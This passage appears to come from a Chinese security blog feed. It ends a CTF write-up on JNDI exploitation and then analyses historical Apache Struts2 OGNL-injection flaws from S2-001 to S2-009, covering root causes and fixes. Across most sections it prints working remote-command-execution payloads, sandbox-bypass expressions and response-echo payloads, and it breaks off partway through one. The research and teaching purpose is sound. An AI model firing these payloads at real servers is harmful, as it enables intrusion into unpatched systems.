href="https://paper.seebug.org/942/" target="_blank" rel="noopener">KINGX的文章</a>。</p><p>而本题考查的为高版本jdk环境下的利用，那么就有两种选择，一为本地利用链触发命令来执行，二为本地ObjectFactory达成代码执行。</p><p>从题目的依赖来看，我们并不能找到一个合适的本地利用链来达成利用，那么考察的就是第二个方法的利用了。因为题目用的是spring boot embedded tomcat，所以我们能直接利用KINGX师傅文章中提到的方法，具体的利用过程不提了，可以用我的ysomap来达成命令执行的效果</p><p><img src="/images/xnuca-2020-easyjava/image-20201102164333062.png" alt="image-20201102164333062"></p><h2 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h2><p><a href="https://github.com/NeSE-Team/XNUCA2020Qualifier/blob/main/Web/easyjava/ImageUtil.java" target="_blank" rel="noopener">exp.java</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>struts2历史漏洞分析</title>
      <link href="2020/05/22/java-talk-about-struts2/"/>
      <url>2020/05/22/java-talk-about-struts2/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><hr><p>17年的时候整理过struts2相关的POC，时隔3年，虽然struts2已经不再那么流行了，但是还是有很大的研究价值，本文将一点一点跟一下struts2 有价值的漏洞XD</p><a id="more"></a><h1 id="0x01-基础"><a href="#0x01-基础" class="headerlink" title="0x01 基础"></a>0x01 基础</h1><hr><p>struts2 源码下载<a href="https://archive.apache.org/dist/struts/source/" target="_blank" rel="noopener">https://archive.apache.org/dist/struts/source/</a></p><p>struts2工作流程 <a href="https://blog.csdn.net/snow_7/article/details/51513381" target="_blank" rel="noopener">https://blog.csdn.net/snow_7/article/details/51513381</a></p><p>ognl表达式<a href="https://www.cnblogs.com/renchunxiao/p/3423299.html" target="_blank" rel="noopener">https://www.cnblogs.com/renchunxiao/p/3423299.html</a></p><p>struts2 技术内幕 第6章 OGNL</p><p>struts2漏洞的产生通OGNL表达式的执行有很大的关联，历史上很多版本的漏洞，都是因为不安全的用户输入流转到了<code>Ognl.getValue</code>、<code>Ognl.setValue</code>而导致的OGNL表达式的计算。后文不对Ognl后续的内容做分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 调用静态函数 执行命令</span></span><br><span class="line">Ognl.getValue(<span class="string">"@java.lang.Runtime@getRuntime().exec('open /Applications/Calculator.app/')"</span>, context);</span><br><span class="line">Ognl.setValue(<span class="string">"(\"@java.lang.Runtime@getRuntime().exec(\'open /System/Applications/Calculator.app/\')\")(bla)(bla)"</span>,context,<span class="string">""</span>);</span><br></pre></td></tr></table></figure><p>更多用法看<a href="http://commons.apache.org/proper/commons-ognl/language-guide.html" target="_blank" rel="noopener">http://commons.apache.org/proper/commons-ognl/language-guide.html</a></p><p>其中关于<code>setValue</code>的利用用的是Expression Evaluation部分，<code>(1)(2)(3)</code>中<code>(1)(2)</code>被作为一个整体解析，对于<code>(1)</code>做表达式的解析，如果你用<code>getValue((1)(2))</code>会发现其实也能执行命令，而<code>setValue((1)(2)(3))</code>需要double evaluation，实际上变成<code>((1)(2))(3)</code>，在后续调用<code>setValueBody</code>函数时取出的<code>children[0]</code>就是<code>(1)(2)</code>，等同于调用<code>Ognl.getValue((1)(2))</code>的效果。所以这里调用<code>setValue</code>也同样可以达成<code>getValue</code>的计算OGNL表达式的效果。</p><p><img src="/images/talk_about_struts2/image-20200506154002054.png" alt="image-20200506154002054"></p><p>同样，我们也可以利用<code>children[1]</code>的位置，如<code>(1)((2)(3))</code>把payload放到<code>(2)(3)</code></p><p>关于<code>setValue</code>函数的另一种利用方法S2-009的方式<code>a[(1)(2)]</code>，其中<code>(1)(2)</code>后续会单独拿出来被当作OGNL表达式执行。</p><h1 id="0x02-历史版本回顾"><a href="#0x02-历史版本回顾" class="headerlink" title="0x02 历史版本回顾"></a>0x02 历史版本回顾</h1><hr><h2 id="1-S2-001"><a href="#1-S2-001" class="headerlink" title="1. S2-001"></a>1. <a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">S2-001</a></h2><p>参考：<a href="https://xz.aliyun.com/t/2044" target="_blank" rel="noopener">https://xz.aliyun.com/t/2044</a></p><p>漏洞产生原因在于：用<code>&lt;s:textfield&gt;</code>标签，原样返回用户输入时，会过一次OGNL表达式的解析执行。比如场景登陆的地方，用户名密码校验错误，不跳转页面，直接将用户名和密码放到页面解析后返回。</p><p>source: 使用了<code>s:textfield</code>标签用于表单生成，当用户输入不合法时，将用户的输入内容渲染到返回的页面上</p><p>sink: jsp渲染调用<code>doEndTag</code>，后续由于识别出用户输入中OGNL表达式而调用<code>Ognl.getValue</code></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>主要出问题的是JSP中<code>&lt;s:textfield&gt;</code>标签，Struts2里处理textfield的是<code>org.apache.struts2.components.UIBean</code></p><p><img src="/images/talk_about_struts2/image-20200428211153680.png" alt="image-20200428211153680"></p><p><img src="/images/talk_about_struts2/image-20200428212308880.png" alt="image-20200428212308880"></p><p>看到在处理params时，当parameters里不存在<code>value</code>这个key的时候，会进到执行name相对应的value上来。并且<code>altSyntax</code>默认配置为<code>true</code></p><p><img src="/images/talk_about_struts2/image-20200428213206168.png" alt="image-20200428213206168"></p><p>会在当前的<code>name</code>左右加上OGNL表达式的标识<code>%{name}</code>，这里的name是<code>&lt;s:textfield name=&quot;name&quot;</code>，name字段的值，比如这里<code>name=&quot;username&quot;</code>，此时会变成<code>%{username}</code>.继续往下跟</p><p><img src="/images/talk_about_struts2/image-20200428220429903.png" alt="image-20200428220429903"></p><p><img src="/images/talk_about_struts2/image-20200428220447992.png" alt="image-20200428220447992"></p><p>这里的String类型的转化主要用了<code>TextParesUtil.translateVariables()</code>来处理，这里看看具体他怎么做的</p><p><code>com.opensymphony.xwork2.util.TextParseUtil#translateVariables#97</code></p><p><img src="/images/talk_about_struts2/image-20200428221026617.png" alt="image-20200428221026617"></p><p>这里会去判断传入的expression是否是OGNL表达式的格式的<code>%{xxx}</code>，如果是的话，就会去<code>OgnlValueStack</code>里面去找对应的内容(这块就是OGNL表达式的计算结果，<code>findValue</code>函数后续会去调用<code>OgnlUtil.getValue</code>，详细的可以看我基础里列的文章)</p><p>所以这里我们第一遍传入的<code>%{name}</code>会解析获得对应的值<code>%{@java.lang.Runtime.....}</code></p><p>第二遍会去解析<code>%{@java.lang.Runtime....}</code>，这里执行了我们想要执行的命令。</p><h3 id="回显POC"><a href="#回显POC" class="headerlink" title="回显POC"></a>回显POC</h3><p>前面简单用了OGNL表达式调用静态方法的形式来执行系统命令<code>@java.lang.Runtime@getRuntime().exec(command)</code></p><p>这里S2-001其实是会直接回显的，将替换原有的input标签的内容，这里换一种方式来进行回显，利用Struts2的HttpServletResponse来写入内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),</span><br><span class="line">#writer.println(xxxxxx),</span><br><span class="line">#writer.flush(),</span><br><span class="line">#writer.close()</span><br></pre></td></tr></table></figure><p>先从上下文context中取出<code>HttpServletResponse</code>的实例，用到的实际是<code>HttpServletResponseWrapper</code></p><p><img src="/images/talk_about_struts2/image-20200428223750035.png" alt="image-20200428223750035"></p><p>然后获取当前response的writer对象，在利用该writer来写入任意内容</p><p>比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#writer.println(&quot;wh1t3p1g&quot;),#writer.flush(),#writer.close()&#125;</span><br></pre></td></tr></table></figure><p>当然你也可以替换成执行命令后的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#pb=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),</span><br><span class="line">#is=#pb.getInputStream(),</span><br><span class="line">#isr=new InputStreamReader(#is),</span><br><span class="line">#br=new BufferedReader(#isr),</span><br><span class="line">#chars=new char[500],</span><br><span class="line">#br.read(#chars),</span><br><span class="line">#str=new java.lang.String(#chars),</span><br><span class="line">// 上面主要获取执行后的内容，下面主要做回显操作</span><br><span class="line">#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),</span><br><span class="line">#writer.println(#str),</span><br><span class="line">#writer.flush(),</span><br><span class="line">#writer.close()</span><br><span class="line"></span><br><span class="line">%&#123;#pb=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),#is=#pb.getInputStream(),#isr=new java.io.InputStreamReader(#is),#br=new java.io.BufferedReader(#isr),#chars=new char[500],#br.read(#chars),#str=new java.lang.String(#chars),#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(), #writer.println(#str),#writer.flush(),#writer.close()&#125;</span><br></pre></td></tr></table></figure><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>在&gt;=2.0.9版本的struts2上，<code>com.opensymphony.xwork2.util.TextParseUtil#translateVariables</code>做了循环判断，不允许递归执行OGNL表达式</p><p><img src="/images/talk_about_struts2/image-20200428231900257.png" alt="image-20200428231900257"></p><p>默认<code>maxLoopCount</code>为1，所以处理完<code>%{name}</code>后，不会再继续对他的值进行OGNL表达式的执行了。</p><h2 id="2-S2-003"><a href="#2-S2-003" class="headerlink" title="2. S2-003"></a>2. <a href="https://cwiki.apache.org/confluence/display/WW/S2-003" target="_blank" rel="noopener">S2-003</a></h2><p>影响范围：2.0.0 - 2.0.11.2</p><p>看官网的介绍，问题出在<code>ParametersInterceptor</code>，前面利用了<code>Ognl.getValue</code>来计算OGNL表达式，而S2-003用的则是<code>Ognl.setValue</code>，该函数也同样可以计算OGNL表达式</p><p>source: 参数的key，使用unicode编码绕过<code>#</code>的检测</p><p>sink: 调用<code>Ognl.setValue</code></p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>Struts2在处理参数内容时，将调用<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters</code>函数，填充到OgnlVauleStack的context上下文里。</p><p><img src="/images/talk_about_struts2/image-20200430155156109.png" alt="image-20200430155156109"></p><p>这里会先过一次<code>acceptableName</code>的检查（2.0.8版本）</p><p><img src="/images/talk_about_struts2/image-20200430155231489.png" alt="image-20200430155231489"></p><p>不能出现<code>=</code>、<code>,</code>、<code>#</code>、<code>:</code>以及被排除在外的参数名</p><p><img src="/images/talk_about_struts2/image-20200430155418664.png" alt="image-20200430155418664"></p><p>只有通过了acceptableName函数的检查才能继续往下走，所以我们必须绕过上面的几个问题，这里漏洞发现者用了unicode编码来绕过检测。</p><p><code>ognl.JavaCharStream#readChar</code></p><p><img src="/images/talk_about_struts2/image-20200430232206989.png" alt="image-20200430232206989"></p><p>当遇到<code>\u</code>unicode编码，会做一次转换，比如<code>\u0040</code>会被转成<code>@</code></p><p>而<code>acceptableName</code>函数并没有考虑unicode编码的方式，导致其形同虚设。</p><p>回到<code>setParameters</code>，后续调用了<code>OgnlValueStack.setValue</code></p><p><img src="/images/talk_about_struts2/image-20200430232635455.png" alt="image-20200430232635455"></p><p>这里最终到了<code>OgnlUtil.setValue</code>计算OGNL表达式</p><h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><p>来看一个调用命令执行的POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse'</span>)(bla)(bla)&amp;(<span class="string">'\u0040java.lang.Runtime@getRuntime().exec(\'open /System/Applications/Calculator.app\')'</span>)(bla)(bla)</span><br></pre></td></tr></table></figure><p>先来看第一句，该条ognl表达式用于开启方法执行，因为在调用<code>setParameters</code>之前，开发人员考虑到了参数执行OGNL表达式的风险，所以提前关闭了函数调用执行</p><p><img src="/images/talk_about_struts2/image-20200430234629782.png" alt="image-20200430234629782"></p><p>设置完了之后，再还原回来</p><p>但是OGNL表达式对于上下文的内容是可控的，我们可以在进行函数调用前，将context里的<code>xwork.MethodAccessor.denyMethodExecution</code>设为<code>false</code>， 这样第二句poc就可以执行函数调用了。</p><p>所以在发送这两条POC时，需要控制好设置false在前，执行在后（ascii排序，可以看回显poc的处理）</p><p>跟前面一样，写一下回显的POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(a)((<span class="string">'\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse'</span>)(bla))</span><br><span class="line">(b)((<span class="string">'\u0023ret\u003d@java.lang.Runtime@getRuntime().exec(\'id\')'</span>)(bla))&amp; <span class="comment">// 执行命令</span></span><br><span class="line">(c)((<span class="string">'\u0023dis\u003dnew\u0020java.io.DataInputStream(\u0023ret.getInputStream())'</span>)(bla))&amp;</span><br><span class="line">(d)((<span class="string">'\u0023res\u003dnew\u0020byte[2000]'</span>)(bla))&amp;</span><br><span class="line">(e)((<span class="string">'\u0023dis.readFully(\u0023res)'</span>)(bla))&amp;</span><br><span class="line">(f)((<span class="string">'\u0023writer\u003d\u0023context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\').getWriter()'</span>)(bla))&amp;</span><br><span class="line">(g)((<span class="string">'\u0023writer.println(new\u0020java.lang.String(\u0023res))'</span>)(bla))&amp; <span class="comment">// 获取response，回显数据</span></span><br><span class="line">(h)((<span class="string">'\u0023writer.flush()'</span>)(bla))&amp;</span><br><span class="line">(i)((<span class="string">'\u0023writer.close()'</span>)(bla))</span><br></pre></td></tr></table></figure><p>这里poc的先后顺序用到了第一个位置，实际的ognl表达式放到了第二个位置<code>(1)((2)(3))</code></p><h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><p>xwork&gt;=2.0.6 <code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters</code>多了以下代码</p><p><img src="/images/talk_about_struts2/image-20200507101610804.png" alt="image-20200507101610804"></p><p>低版本用的直接是已存在的OgnlValueStack，从2.0.6开始，使用了一个空的stack来处理参数的解析</p><p>并且从这个版本开始多了SecurityMemberAccess，用来限制ognl表达式中函数调用</p><p>在<code>ognl.OgnlRuntime#callAppropriateMethod</code>调用函数前，会去判断函数是否可被访问(method不为null)</p><p><img src="/images/talk_about_struts2/image-20200507102155210.png" alt="image-20200507102155210"></p><p>其实这边<code>isMethodAccessible</code>的返回结果无所谓，但是不能在这个函数调用时出错，出错的话也就走不到<code>invokeMethod</code></p><p>看一下具体的实现，<code>isMethodAccessible</code>的判断依赖于<code>SecurityMemberAccess</code></p><p><img src="/images/talk_about_struts2/image-20200507102334789.png" alt="image-20200507102334789"></p><p><img src="/images/talk_about_struts2/image-20200507103428140.png" alt="image-20200507103428140"></p><p>这里我们主要看<code>isAcceptableProperty</code></p><p><img src="/images/talk_about_struts2/image-20200507103621957.png" alt="image-20200507103621957"></p><p><img src="/images/talk_about_struts2/image-20200507103632321.png" alt="image-20200507103632321"></p><p><img src="/images/talk_about_struts2/image-20200507103642250.png" alt="image-20200507103642250"></p><p>下端点调试你会发现这个版本acceptProperties为空，而excludeProperties非空，所以在调用<code>isExclude</code>函数时，正则调用<code>pattern.matcher(null)</code>会报错，也就无法达到调用函数的目的了（<code>propertiesName</code>为null）。</p><p>所以如果要绕过这个版本的限制，首先需要解决的是这个函数的报错问题，看S2-005</p><h2 id="3-S2-005"><a href="#3-S2-005" class="headerlink" title="3. S2-005"></a>3. <a href="https://cwiki.apache.org/confluence/display/WW/S2-005" target="_blank" rel="noopener">S2-005</a></h2><p>影响版本：struts2.0.0 - 2.1.8.1</p><p>S2-005为S2-003的修复绕过，直接分析POC</p><h3 id="POC分析-1"><a href="#POC分析-1" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET'</span>)(bla)(bla)&amp;</span><br><span class="line">(<span class="string">'\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse'</span>)(bla)(bla)&amp;</span><br><span class="line">(<span class="string">'\u0040java.lang.Runtime@getRuntime().exec(\'open\u0020/System/Applications/Calculator.app\')'</span>)(bla)(bla)</span><br></pre></td></tr></table></figure><p>前面S2-003修复部分说到了需要绕过<code>isAcceptableProperty</code>函数报错的问题才能继续往下进行函数调用。</p><p>从代码上看，只要<code>excludeProperties</code>和<code>acceptProperties</code>为空，就不会进到正则匹配的环节，所以需要将他们置为空</p><p>poc里的第一行做的就是这个事情，将<code>excludeProperties</code>置为空集合</p><p>这里看一下为什么以<code>#_memberAccess</code>的方式可以访问到<code>OgnlContext</code>对象的<code>memberAccess</code>属性</p><p><code>ognl.OgnlContext#get</code></p><p><img src="/images/talk_about_struts2/image-20200507110201209.png" alt="image-20200507110201209"></p><p>从<code>OgnlContext</code>上下文获取内容，首先会判断是否在<code>RESERVED_KEYS</code>集合里，如果存在，则相应的调用他的getters，如果不存在，则从当前的上下文里去找这个key。</p><p>所以<code>#_memeberAccess</code>实际获取的是<code>OgnlContext</code>的<code>memeberAccess</code>属性内容</p><p>还有出现变化的地方，由于现在context里是没有response对象可以获取的，所以在处理回显的时候我们需要找另外的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(a)((<span class="string">'\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET'</span>)(bla))&amp;</span><br><span class="line">(a)((<span class="string">'\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse'</span>)(bla))&amp;</span><br><span class="line">(b)((<span class="string">'\u0023ret\u003d@java.lang.Runtime@getRuntime().exec(\'id\')'</span>)(bla))&amp; <span class="comment">// 执行命令</span></span><br><span class="line">(c)((<span class="string">'\u0023dis\u003dnew\u0020java.io.DataInputStream(\u0023ret.getInputStream())'</span>)(bla))&amp;</span><br><span class="line">(d)((<span class="string">'\u0023res\u003dnew\u0020byte[2000]'</span>)(bla))&amp;</span><br><span class="line">(e)((<span class="string">'\u0023dis.readFully(\u0023res)'</span>)(bla))&amp;</span><br><span class="line">(f)((<span class="string">'\u0023writer\u003d@org.apache.struts2.ServletActionContext@getResponse().getWriter()'</span>)(bla))&amp;</span><br><span class="line">(g)((<span class="string">'\u0023writer.println(new\u0020java.lang.String(\u0023res))'</span>)(bla))&amp; <span class="comment">// 获取response，回显数据</span></span><br><span class="line">(h)((<span class="string">'\u0023writer.flush()'</span>)(bla))&amp;</span><br><span class="line">(i)((<span class="string">'\u0023writer.close()'</span>)(bla))</span><br></pre></td></tr></table></figure><p>这里使用了<a href="mailto:`@org.apache.struts2.ServletActionContext" target="_blank" rel="noopener">`@org.apache.struts2.ServletActionContext</a>@getResponse()`静态方法来获取response</p><h3 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h3><p>xwork&gt;=2.2.1.1，对参数名做了更为细致的正则检查<code>[a-zA-Z0-9\\.\\]\\[\\(\\)_&#39;\\s]+</code></p><h2 id="4-S2-007"><a href="#4-S2-007" class="headerlink" title="4. S2-007"></a>4. S2-007</h2><p>这里跟S2-008里面的第一个漏洞一样</p><p><code>com.opensymphony.xwork2.interceptor.ConversionErrorInterceptor#intercept</code></p><p><img src="/images/talk_about_struts2/image-20200509111903026.png" alt="image-20200509111903026"></p><p>value为我们传入的数据，过了一次getOverrideExpr</p><p><img src="/images/talk_about_struts2/image-20200509111939166.png" alt="image-20200509111939166"></p><p>对我们的输入围上了单引号，这里如果我们的payload为<code>&#39;+xxxx+&#39;</code>，这里的xxxx就逃逸出来了，而不单单是字符串了</p><p><img src="/images/talk_about_struts2/image-20200509112218065.png" alt="image-20200509112218065"></p><p>后续将处理好的数据放到了stack的overrides里面</p><p>而实际触发的地方跟S2-001一样，是在解析JSP的时候造成的</p><p><img src="/images/talk_about_struts2/image-20200509114347567.png" alt="image-20200509114347567" style="zoom:50%;"></p><p>在<code>tryFIndValue</code>函数中，从stack的overrides中取出前面加了单引号的数据，并在后续调用<code>Ognl.getValue</code>，导致了Ognl表达式的执行。</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+ (#_memberAccess.allowStaticMethodAccess=true,#context['</span>xwork.MethodAccessor.denyMethodExecution<span class="string">']=false,@java.lang.Runtime@getRuntime().exec('</span>open /System/Applications/Calculator.app<span class="string">')) +'</span></span><br></pre></td></tr></table></figure><p>xwork&gt;=2.2.3，ognl表达式计算时，调用函数的函数判断<code>isAcceptableProperty</code>如果name为null直接返回true，所以我们不用像s2-005那样把<code>excludeProperties</code>置为空集合。</p><p><img src="/images/talk_about_struts2/image-20200509120444634.png" alt="image-20200509120444634"></p><p>但是从这里开始，<code>allowStaticMethodAccess</code>默认为false，我们需要将其置为true，才能正常执行静态函数。</p><p>所以POC第一二句都是在解除限制，第三句执行命令</p><p>写一下回显的POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+ (</span></span><br><span class="line"><span class="string">#_memberAccess.allowStaticMethodAccess=true,</span></span><br><span class="line"><span class="string">#context['</span>xwork.MethodAccessor.denyMethodExecution<span class="string">']=false,</span></span><br><span class="line"><span class="string">#ret=@java.lang.Runtime@getRuntime().exec('</span>id<span class="string">'),</span></span><br><span class="line"><span class="string">#isr=new java.io.InputStreamReader(#ret.getInputStream()),</span></span><br><span class="line"><span class="string">#br=new java.io.BufferedReader(#isr),</span></span><br><span class="line"><span class="string">#res=new char[2000],</span></span><br><span class="line"><span class="string">#br.read(#res),</span></span><br><span class="line"><span class="string">#writer=#context['</span>com.opensymphony.xwork2.dispatcher.HttpServletResponse<span class="string">'].getWriter(),</span></span><br><span class="line"><span class="string">#writer.println(new java.lang.String(#res)),</span></span><br><span class="line"><span class="string">#writer.flush(),</span></span><br><span class="line"><span class="string">#writer.close()</span></span><br><span class="line"><span class="string">) +'</span></span><br></pre></td></tr></table></figure><h2 id="5-S2-008"><a href="#5-S2-008" class="headerlink" title="5. S2-008"></a>5. S2-008</h2><p>S2-008一共有4个漏洞，详细看<a href="https://cwiki.apache.org/confluence/display/WW/S2-008" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-008</a></p><p>其中1跟S2-007类似，3不看了，主要关注2和4</p><h3 id="CookieInterceptor"><a href="#CookieInterceptor" class="headerlink" title="CookieInterceptor"></a>CookieInterceptor</h3><p>这里的原理同S2-005类似，这里看代码比较直观，没有搭环境调了</p><p><code>org.apache.struts2.interceptor.CookieInterceptor#intercept</code></p><p><img src="/images/talk_about_struts2/image-20200509202547849.png" alt="image-20200509202547849"></p><p><img src="/images/talk_about_struts2/image-20200509202741614.png" alt="image-20200509202741614"></p><p>这里会到<code>OgnlValueStack.setValue</code>，也就是后续调用<code>Ognl.setValue</code>，用<code>((1)(2))(3)</code>的方式来执行任意OGNL表达式</p><h3 id="DebuggingInterceptor"><a href="#DebuggingInterceptor" class="headerlink" title="DebuggingInterceptor"></a>DebuggingInterceptor</h3><p><img src="/images/talk_about_struts2/image-20200509204915751.png" alt="image-20200509204915751"></p><p>当开启开发者模式时，传入<code>debug=command&amp;expression=xxxx</code>，即可执行OGNL表达式</p><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?debug=command&amp;expression=(%<span class="number">23</span>_memberAccess.allowStaticMethodAccess=<span class="keyword">true</span>,<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'open /System/Applications/Calculator.app'</span>))</span><br><span class="line"><span class="comment">// 回显POC</span></span><br><span class="line">(%<span class="number">23</span>_memberAccess.allowStaticMethodAccess=<span class="keyword">true</span>,%<span class="number">23</span>ret=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'id'</span>),%<span class="number">23</span>isr=<span class="keyword">new</span> java.io.InputStreamReader(%<span class="number">23</span>ret.getInputStream()),%<span class="number">23</span>br=<span class="keyword">new</span> java.io.BufferedReader(%<span class="number">23</span>isr),%<span class="number">23</span>res=<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">2000</span>],%<span class="number">23</span>br.read(%<span class="number">23</span>res),<span class="keyword">new</span> java.lang.String(%<span class="number">23</span>res))</span><br></pre></td></tr></table></figure><h2 id="6-S2-009"><a href="#6-S2-009" class="headerlink" title="6. S2-009"></a>6. <a href="https://cwiki.apache.org/confluence/display/WW/S2-009" target="_blank" rel="noopener">S2-009</a></h2><p>影响范围：2.0.0 - 2.3.1.1</p><p>针对S2-005的修复，对参数做<code>[a-zA-Z0-9\\.\\]\\[\\(\\)_&#39;\\s]+</code>正则检查，这里规避了参数名中出现<code>#</code>、unicode编码等</p><p>S2-009是对S2-005的绕过，这里用的就是<code>Ognl.setValue</code>函数的另一种用法<code>a[(1)(2)]</code>，还有一个比较巧妙的是，前面的几个漏洞利用，我们都是直接在<code>(1)</code>写上要执行的OGNL表达式，而S2-009则通过context里的内容来进行一个中转，将OGNL表达式放到<code>key=value</code>的value的位置，再由<code>a[(key)(2)]</code>的方式去执行value的内容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">OgnlContext context = <span class="keyword">new</span> OgnlContext();</span><br><span class="line">context.put(<span class="string">"test"</span>,<span class="string">"@java.lang.Runtime@getRuntime().exec(\'open /System/Applications/Calculator.app/\')"</span>); <span class="comment">// 假设context存在执行系统命令的OGNL表达式test</span></span><br><span class="line">Ognl.setValue(<span class="string">"a[(test)(bla)]"</span>,context,<span class="string">""</span>);<span class="comment">// 以a[(test)(bla)],执行test所代表的OGNL表达式</span></span><br></pre></td></tr></table></figure><p>上面代码中的假设，我们可以通过传入<code>?param=xxx</code>的方式带入</p><p>注意这里的param需要是当前Action的一个类属性（也就是原本就存在的参数名），比如原本表单里就有password，那么你就可以在password里面填充OGNL表达式</p><p>因为在计算OGNL表达式<code>(password)(bla)</code>的时候(解析出两个ASTProperty)</p><p><img src="/images/talk_about_struts2/image-20200511171450014.png" alt="image-20200511171450014"></p><p>后续再执行过程中，会去查找当前的action里面是否含有这个属性</p><p><img src="/images/talk_about_struts2/image-20200511171056619.png" alt="image-20200511171056619"></p><p><code>com.opensymphony.xwork2.ognl.accessor.CompoundRootAccessor#getProperty</code></p><p><img src="/images/talk_about_struts2/image-20200511204523185.png" alt="image-20200511204523185"></p><p>如果当前存在这个属性的时候，返回其内容</p><p>后续就是跟<code>(1)(2)</code>这种执行的原理一样，会以<code>(1)</code>作为node调用getValue。</p><p>这里巧妙的就是利用这种中转的方式，规避了参数名的正则检测</p><h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?password=(%<span class="number">23</span>_memberAccess.allowStaticMethodAccess=<span class="keyword">true</span>,%<span class="number">23</span>context[<span class="string">'xwork.MethodAccessor.denyMethodExecution'</span>]=<span class="keyword">false</span>,<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'open /System/Applications/Calculator.app'</span>))&amp;z[(password)(bla)]=<span class="number">1</span></span><br><span class="line"><span class="comment">// 回显POC</span></span><br><span class="line">?password=(%<span class="number">23</span>_memberAccess.allowStaticMethodAccess=<span class="keyword">true</span>,%<span class="number">23</span>context[<span class="string">'xwork.MethodAccessor.denyMethodExecution'</span>]=<span class="keyword">false</span>,%<span class="number">23</span>ret=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'id'</span>),%<span 